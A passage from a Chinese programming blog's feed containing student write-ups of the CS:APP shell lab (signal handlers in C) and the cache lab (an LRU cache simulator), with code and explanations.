class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>    <span class="hljs-type">int</span> olderrno = errno;   <span class="hljs-comment">//由于errno是全局变量,注意保存和恢复errno</span><br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>;</span><br>    <span class="hljs-type">sigset_t</span> mask, prev;<br>    sigfillset(&amp;mask);<br>    <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="hljs-number">0</span>)&#123;      <span class="hljs-comment">//立即返回该子进程的pid</span><br>        sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);   <span class="hljs-comment">//阻塞所有信号</span><br>        <span class="hljs-keyword">if</span> (WIFEXITED(status))&#123;                 <span class="hljs-comment">//正常终止</span><br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSIGNALED(status))&#123;          <span class="hljs-comment">//因为信号而终止, 打印</span><br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));<br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFSTOPPED(status))&#123;           <span class="hljs-comment">//因为信号而停止, 打印</span><br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));<br>            job = getjobpid(jobs, pid);<br>            job-&gt;state = ST;<br>        &#125;<br>        sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);          <br>    &#125;<br>    errno = olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="sigint-handler"><a href="#sigint-handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h5><p>实现一个SIGINT信号处理函数，将信号传给前台程序</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br>void sigint<span class="hljs-constructor">_handler(<span class="hljs-params">int</span> <span class="hljs-params">sig</span>)</span> <br>&#123;<br>    <span class="hljs-built_in">int</span> olderrno = errno;<br>    <span class="hljs-built_in">int</span> pid;<br>    sigset_t mask_all, prev;<br>    <span class="hljs-constructor">Sigfillset(&amp;<span class="hljs-params">mask_all</span>)</span>;<br>    <span class="hljs-constructor">Sigprocmask(SIG_BLOCK, &amp;<span class="hljs-params">mask_all</span>, &amp;<span class="hljs-params">prev</span>)</span>;   <span class="hljs-comment">//jobs为全局变量</span><br>    <span class="hljs-keyword">if</span>((pid = fgpid(jobs)) != <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-constructor">Sigprocmask(SIG_SETMASK, &amp;<span class="hljs-params">prev</span>, NULL)</span>;<br>        <span class="hljs-constructor">Kill(-<span class="hljs-params">pid</span>, SIGINT)</span>;<br>    &#125;<br>    errno = olderrno;<br>    return;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="sigstp-handler"><a href="#sigstp-handler" class="headerlink" title="sigstp_handler"></a>sigstp_handler</h4><p>实现一个SIGSTOP信号处理函数，将信号传给前台程序</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br>void sigtstp<span class="hljs-constructor">_handler(<span class="hljs-params">int</span> <span class="hljs-params">sig</span>)</span> <br>&#123;<br>     <span class="hljs-built_in">int</span> olderrno = errno;<br>    <span class="hljs-built_in">int</span> pid;<br>    sigset_t mask_all, prev;<br>    <span class="hljs-constructor">Sigfillset(&amp;<span class="hljs-params">mask_all</span>)</span>;<br>    <span class="hljs-constructor">Sigprocmask(SIG_BLOCK, &amp;<span class="hljs-params">mask_all</span>, &amp;<span class="hljs-params">prev</span>)</span>;<br>    <span class="hljs-keyword">if</span>((pid = fgpid(jobs)) &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-constructor">Sigprocmask(SIG_SETMASK, &amp;<span class="hljs-params">prev</span>, NULL)</span>;<br>        <span class="hljs-constructor">Kill(-<span class="hljs-params">pid</span>, SIGSTOP)</span>;<br>    &#125;<br>    errno = olderrno;<br>    return;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181739389.png" alt="test16"></p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181740032.png" alt="test15"></p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202401181740304.png" alt="test14"></p><p>左边参考 右边自己实现</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>从未想过每天都在使用的shell需要考虑这么多：回收进程、竞争避免等</li><li>第一次接触并行并发的概念，希望能再厉害一点点</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp cash_lab</title>
    <link href="/2023/11/17/csapp-cash-lab/"/>
    <url>/2023/11/17/csapp-cash-lab/</url>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>csapp 3e 第6章</p><h2 id="Part-A-Writing-a-Cache-Simulator"><a href="#Part-A-Writing-a-Cache-Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h2><p>In Part A you will write a cache simulator in <code>csim.c</code> that takes a <code>valgrind</code> memory trace as input, simulates the hit&#x2F;miss behavior of a cache memory on this trace, and outputs the total number of hits, misses, and evictions.</p><p>要求编写cache模拟器，模拟cache在这个trace的hit&#x2F;miss表现，并输出hit miss evictions的总数</p><p>lab给出了可供参考的cache模拟器，其有以下六个参数</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">Usage: ./csim-ref [-hv] -s <span class="hljs-symbol">&lt;s&gt;</span> -E <span class="hljs-symbol">&lt;E&gt;</span> -<span class="hljs-keyword">b</span> <span class="hljs-symbol">&lt;b&gt;</span> -t <span class="hljs-symbol">&lt;tracefile&gt;</span><br>• -h: Optional <span class="hljs-keyword">help</span> flag that prints usage info<br>• -v: Optional <span class="hljs-keyword">verbose</span> flag that displays trace info<br>• -s <span class="hljs-symbol">&lt;s&gt;</span>: Number of <span class="hljs-keyword">set</span> <span class="hljs-built_in">index</span> bits (S = <span class="hljs-number">2</span>^s <span class="hljs-keyword">is</span> the <span class="hljs-keyword">number</span> of sets)<br>• -E <span class="hljs-symbol">&lt;E&gt;</span>: Associativity (<span class="hljs-keyword">number</span> of lines per <span class="hljs-keyword">set</span>)<br>• -<span class="hljs-keyword">b</span> <span class="hljs-symbol">&lt;b&gt;</span>: Number of block bits (B = <span class="hljs-number">2</span>^<span class="hljs-keyword">b</span> <span class="hljs-keyword">is</span> the block size)<br>• -t <span class="hljs-symbol">&lt;tracefile&gt;</span>: Name of the valgrind trace <span class="hljs-keyword">to</span> replay<br></code></pre></td></tr></table></figure><p>trace文件夹包含了用于评估模拟器的trace文件，其使用<code>valgrind</code>生成</p><p>trace文件中具体定义为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">I</span> <span class="hljs-number">0400</span>d7d4,<span class="hljs-number">8</span><br><span class="hljs-attribute">M</span> <span class="hljs-number">0421</span>c7f0,<span class="hljs-number">4</span><br><span class="hljs-attribute">L</span> <span class="hljs-number">04</span>f6b868,<span class="hljs-number">8</span><br><span class="hljs-attribute">S</span> <span class="hljs-number">7</span>ff0005c8,<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>其具体格式为</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[space]</span>operation <span class="hljs-selector-tag">address</span>,size<br></code></pre></td></tr></table></figure><p>The operation field denotes the type of memory access: “I” denotes an instruction load, “L” a data load, “S” a data store, and “M” a data modify (i.e., a data load followed by a data store). There is never a space before each “I”. There is always a space before each “M”, “L”, and “S”. The address field specifies a 64-bit hexadecimal memory address. The size field specifies the number of bytes accessed by the operation.</p><p>4种operation</p><ul><li><code>I</code> 表示加载指令  其之前不加[space]</li><li><code>L</code>表示加载数据</li><li><code>S</code>表示存储数据</li><li><code>M</code>表示修改数据</li></ul><h3 id="回顾cache结构"><a href="#回顾cache结构" class="headerlink" title="回顾cache结构"></a>回顾cache结构</h3><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171058687.png" alt="cache"></p><p>Cache 类似于一个二维数组，它有 S&#x3D;2^s 组，每组有 E 行，每行存储的字节也是固定的。其中，每行都有一个有效位，和一个标记位。想要查找到对应的字节，我们的地址需要三部分组成：</p><ul><li>s，索引位，找到对应的组序号</li><li>tag，标记位，在组中的每一行进行匹配，判断能否命中</li><li>b，块偏移，表明在找到的行中的具体位置。本实验不考虑块偏移，完全可以忽略。</li></ul><p>那么，Cache 中的有效位是干什么的呢？判断该行是否为空。这里有一个概念：<strong>冷不命中</strong>，表示该缓存块为空造成的不命中。而一旦确定不命中不是冷不命中，那么就需要考虑行替换的问题了。我认为，行替换关乎着 Cache 的效率，是 Cache 设计的核心。</p><h3 id="回顾替换策略"><a href="#回顾替换策略" class="headerlink" title="回顾替换策略"></a>回顾替换策略</h3><p>当 CPU 要处理的字不在组中任何一行，且组中没有一个空行，那就必须从里面选取一个非空行进行替换。选取哪个空行进行替换呢？书上给了我们两种策略：</p><ul><li>LFU，最不常使用策略。替换在过去某个窗口时间内引用次数最少的那一行</li><li>LRU，最近最少使用策略。替换最后一次访问时间最久远的哪一行</li></ul><p>本实验要求采取的策略为 <strong>LRU</strong>。</p><p>下面正式开始Part A。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> S;<br>    <span class="hljs-type">int</span> E;<br>    <span class="hljs-type">int</span> B;<br>    Cache_line **line;<br>&#125; Cache;<br></code></pre></td></tr></table></figure><p>用<code>Cache</code>来表示一个缓存，其包括S，B，E等特征，每一个缓存类似于一个二维数组，数组的每一个元素就是缓存中的一个行，数组的每一个元素就是缓存中的行，所以用<code>line</code>来表示这一类信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> valid;     <span class="hljs-comment">//有效位</span><br>    <span class="hljs-type">int</span> tag;       <span class="hljs-comment">//标记位</span><br>    <span class="hljs-type">int</span> time_tamp; <span class="hljs-comment">//时间戳</span><br>&#125; Cache_line;<br></code></pre></td></tr></table></figure><p>valid和tag不赘述，time_tamp是LRU算法用到的特征。</p><p>Cache的初始化如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Init_Cache</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">int</span> E, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-type">int</span> S = <span class="hljs-number">1</span> &lt;&lt; s;<br>    <span class="hljs-type">int</span> B = <span class="hljs-number">1</span> &lt;&lt; b;<br>    cache = (Cache *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Cache));<br>    cache-&gt;S = S;<br>    cache-&gt;E = E;<br>    cache-&gt;B = B;<br>    cache-&gt;line = (Cache_line **)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Cache_line *) * S);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S; i++)<br>    &#123;<br>        cache-&gt;line[i] = (Cache_line *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Cache_line) * E);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; E; j++)<br>        &#123;<br>            cache-&gt;line[i][j].valid = <span class="hljs-number">0</span>; <br>            cache-&gt;line[i][j].tag = <span class="hljs-number">-1</span>;<br>            cache-&gt;line[i][j].time_tamp = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>时间戳的初始设置为0</p><h3 id="LRU时间戳实现"><a href="#LRU时间戳实现" class="headerlink" title="LRU时间戳实现"></a>LRU时间戳实现</h3><p>时间戳越大则表示该行最后访问的时间越久远，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> op_s, <span class="hljs-type">int</span> op_tag)</span>&#123;<br>    cache-&gt;line[op_s][i].valid=<span class="hljs-number">1</span>;<br>    cache-&gt;line[op_s][i].tag = op_tag;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; cache-&gt;E; k++)<br>        <span class="hljs-keyword">if</span>(cache-&gt;line[op_s][k].valid==<span class="hljs-number">1</span>)<br>            cache-&gt;line[op_s][k].time_tamp++;<br>    cache-&gt;line[op_s][i].time_tamp = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码在找到要进行的操作行后调用（无论是不命中还是命中，还是驱逐后）。前两行是对有效位和标志位的设置，与时间戳无关，主要关注后几行：</p><ul><li>遍历组中每一行，并将它们的值加1，也就是说每一行在进行一次操作后时间戳都会变大，表示它离最后操作的时间变久</li><li>将本次操作的行时间戳设置为最小，也就是0</li></ul><p>由此，每次只需要找到时间戳最大的行进行替换就可以了：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf">int find_LRU(int op_s)<br>&#123;<br>    int max_index <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    int max_stamp <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>    for(int i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; cache-&gt;E; i++)&#123;</span><br>        if(cache-&gt;line[op_s][i].time_tamp &gt; max_stamp)&#123;<br>            max_stamp <span class="hljs-operator">=</span> cache-&gt;line[op_s][i].time_tamp<span class="hljs-comment">;</span><br>            max_index <span class="hljs-operator">=</span> i<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>    return max_index<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="缓存搜索与更新"><a href="#缓存搜索与更新" class="headerlink" title="缓存搜索与更新"></a>缓存搜索与更新</h3><p>先解决比较核心的问题，在得知要操作的组<code>op_s</code>以及标志位<code>op_tag</code>后，判断是<code>miss</code>还是<code>hit</code>还是应该<code>eviction</code>调用<code>find_LRU</code>。</p><p>先判断是<code>miss</code>还是<code>hit</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">get_index</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s, <span class="hljs-type">int</span> op_tag)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cache-&gt;line[op_s][i].valid &amp;&amp; cache-&gt;line[op_s][i].tag == op_tag)<br>            <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历所有行，如果某一行有效，且标志位相同，则<code>hit</code>，返回该索引。否则，<code>miss</code>，返回 -1。当接收到-1后，有两种情况：</p><ul><li>冷不命中。组中有空行，只不过还未操作过，有效位为0，找到这个空行即可</li><li>所有行都满了。那么就要用到上面得 LRU 进行选择驱逐</li></ul><p>所以，设计一个判满的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">is_full</span><span class="hljs-params">(<span class="hljs-type">int</span> op_s)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cache-&gt;E; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cache-&gt;line[op_s][i].valid == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>扫描完成后，得到对应行的索引值，就可以调用 LRU 更新函数进行更新了。整体调用如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">void update<span class="hljs-constructor">_info(<span class="hljs-params">int</span> <span class="hljs-params">op_tag</span>, <span class="hljs-params">int</span> <span class="hljs-params">op_s</span>)</span><br>&#123;<br>    <span class="hljs-built_in">int</span> index = get<span class="hljs-constructor">_index(<span class="hljs-params">op_s</span>, <span class="hljs-params">op_tag</span>)</span>;<br>    <span class="hljs-keyword">if</span> (index<span class="hljs-operator"> == </span>-<span class="hljs-number">1</span>)<br>    &#123;<br>        miss_count++;<br>        <span class="hljs-keyword">if</span> (verbose)<br>            printf(<span class="hljs-string">&quot;miss &quot;</span>);<br>        <span class="hljs-built_in">int</span> i = is<span class="hljs-constructor">_full(<span class="hljs-params">op_s</span>)</span>;<br>        <span class="hljs-keyword">if</span>(i==-<span class="hljs-number">1</span>)&#123;<br>            eviction_count++;<br>            <span class="hljs-keyword">if</span>(verbose) printf(<span class="hljs-string">&quot;eviction&quot;</span>);<br>            i = find<span class="hljs-constructor">_LRU(<span class="hljs-params">op_s</span>)</span>;<br>        &#125;<br>        update(i,op_s,op_tag);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        hit_count++;<br>        <span class="hljs-keyword">if</span>(verbose)<br>            printf(<span class="hljs-string">&quot;hit&quot;</span>);<br>        update(index,op_s,op_tag);    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>核心函数已完成</p><h3 id="指令解析"><a href="#指令解析" class="headerlink" title="指令解析"></a>指令解析</h3><p>设计的数据结构解决了对 Cache 的操作问题，LRU 时间戳的实现解决了核心的驱逐问题，缓存扫描解决了对块中哪一列进行操作的问题，而应该对哪一块进行操作呢？接下来要解决的就是指令的解析问题了。</p><p>输入数据为<code>[space]operation address, size</code>的形式，<code>operation</code>很容易获取，重要的是从<code>address</code>中分别获取我们需要的<code>s</code>和<code>tag</code>，<code>address</code>结构如下</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202311171122572.png" alt="address结构"></p><p>这边用到了位移运算，右移（b+s）位即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> op_tag = address &gt;&gt; (s + b);<br></code></pre></td></tr></table></figure><p>获取 s，考虑先右移 b 位，再用无符号 0xFF… 右移后进行与操作将 tag 抹去。为什么要用无符号 0xFF… 右移呢？因为C语言中的右移为算术右移，有符号数右移补位的数为符号位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> op_s = (address &gt;&gt; b) &amp; ((<span class="hljs-type">unsigned</span>)(<span class="hljs-number">-1</span>) &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span>) - s));<br></code></pre></td></tr></table></figure><p>由于数据读写对于本模拟器而言没有区别，因此不同的指令对应的只是cache更新次数的问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">get_trace</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">int</span> E, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    FILE *pFile;<br>    pFile = fopen(t, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (pFile == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> identifier;<br>    <span class="hljs-type">unsigned</span> address;<br>    <span class="hljs-type">int</span> size;<br>    <span class="hljs-comment">// Reading lines like &quot; M 20,1&quot; or &quot;L 19,3&quot;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">fscanf</span>(pFile, <span class="hljs-string">&quot; %c %x,%d&quot;</span>, &amp;identifier, &amp;address, &amp;size) &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">// I读不进来,忽略---size没啥用</span><br>    &#123;<br>        <span class="hljs-comment">//想办法先得到标记位和组序号</span><br>        <span class="hljs-type">int</span> op_tag = address &gt;&gt; (s + b);<br>        <span class="hljs-type">int</span> op_s = (address &gt;&gt; b) &amp; ((<span class="hljs-type">unsigned</span>)(<span class="hljs-number">-1</span>) &gt;&gt; (<span class="hljs-number">8</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span>) - s));<br>        <span class="hljs-keyword">switch</span> (identifier)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-comment">//一次存储一次加载</span><br>            update_info(op_tag, op_s);<br>            update_info(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;L&#x27;</span>:<br>            update_info(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>            update_info(op_tag, op_s);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    fclose(pFile);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>update_info</code>就是对 Cache 进行更新的函数。如果指令是<code>M</code>则一次存储一次加载，总共更新两次，其他指令只用更新一次，而<code>I</code>无需考虑。</p><h3 id="命令行获取参数"><a href="#命令行获取参数" class="headerlink" title="命令行获取参数"></a>命令行获取参数</h3><p>通过阅读<a href="http://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">Cache Lab Implementation and Blocking</a>的提示，我们使用<code>getopt()</code>函数来获取命令行参数的字符串形式，然后用<code>atoi()</code>转换为要用的参数，最后用<code>switch</code>语句跳转到对应功能块。</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 